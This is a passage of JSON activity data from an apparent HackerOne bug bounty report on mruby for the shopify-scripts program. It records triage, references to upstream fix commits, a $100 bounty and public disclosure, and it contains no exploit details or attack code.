patience!\u003c/p\u003e\n","automated_response":true,"created_at":"2017-03-10T11:35:40.028Z","updated_at":"2017-03-10T11:35:40.028Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"shopify-scripts"}},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1532674,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2017-03-10T16:11:51.008Z","updated_at":"2017-03-10T16:11:51.008Z","additional_data":{"old_severity":"High","new_severity":"None","old_severity_id":30390,"new_severity_id":30436},"actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1532702,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We have reproduced the bugs and opened an issue upstream: https://github.com/mruby/mruby/issues/3498","markdown_message":"\u003cp\u003eThank you for your report. We have reproduced the bugs and opened an issue upstream: \u003ca title=\"https://github.com/mruby/mruby/issues/3498\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fissues%2F3498\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/mruby/mruby/issues/3498\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-10T16:18:36.023Z","updated_at":"2017-03-10T16:18:36.023Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1540242,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks again for your report. This issue was addressed in the following upstream commits:\n\nhttps://github.com/mruby/mruby/commit/e3922318bd2679de7930ba7c520d58961340e006\nhttps://github.com/mruby/mruby/commit/f30ec2dfb0217fd1426dbdfa1db22da51bbe73b5\nhttps://github.com/mruby/mruby/commit/94395e81c1e853fbfd507a0d12e5836a64bf0ce7\n\nOur next round of bounty decisions will take place within two weeks, so we'll be in touch with you again soon.\n","markdown_message":"\u003cp\u003eThanks again for your report. This issue was addressed in the following upstream commits:\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://github.com/mruby/mruby/commit/e3922318bd2679de7930ba7c520d58961340e006\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fcommit%2Fe3922318bd2679de7930ba7c520d58961340e006\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/mruby/mruby/commit/e3922318bd2679de7930ba7c520d58961340e006\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n\u003ca title=\"https://github.com/mruby/mruby/commit/f30ec2dfb0217fd1426dbdfa1db22da51bbe73b5\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fcommit%2Ff30ec2dfb0217fd1426dbdfa1db22da51bbe73b5\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/mruby/mruby/commit/f30ec2dfb0217fd1426dbdfa1db22da51bbe73b5\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n\u003ca title=\"https://github.com/mruby/mruby/commit/94395e81c1e853fbfd507a0d12e5836a64bf0ce7\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fcommit%2F94395e81c1e853fbfd507a0d12e5836a64bf0ce7\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/mruby/mruby/commit/94395e81c1e853fbfd507a0d12e5836a64bf0ce7\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eOur next round of bounty decisions will take place within two weeks, so we\u0026#39;ll be in touch with you again soon.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-14T14:58:41.275Z","updated_at":"2017-03-14T14:58:41.275Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"aerodudrizzt","url":"/aerodudrizzt"},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1541596,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of the MRuby project!","markdown_message":"\u003cp\u003eThanks for helping improve the security of the MRuby project!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-14T21:11:27.751Z","updated_at":"2017-03-14T21:11:27.751Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"shopify-scripts"}},"bounty_amount":"100.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify-scripts","collaborator":{"username":"aerodudrizzt","url":"/aerodudrizzt"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1541597,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-03-14T21:11:33.188Z","updated_at":"2017-03-14T21:11:33.188Z","first_to_agree":true,"actor":{"username":"andrewdunbar","cleared":false,"url":"/andrewdunbar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/164/5b0e89675ed6dbb9df87223e9f8f58e2125bb56b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1541625,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thanks for the reward.","markdown_message":"\u003cp\u003eThanks for the reward.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-14T21:25:31.072Z","updated_at":"2017-03-14T21:25:31.072Z","actor":{"username":"aerodudrizzt","cleared":false,"url":"/aerodudrizzt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1541626,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-03-14T21:25:31.118Z","updated_at":"2017-03-14T21:25:31.118Z","actor":{"username":"aerodudrizzt","cleared":false,"url":"/aerodudrizzt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}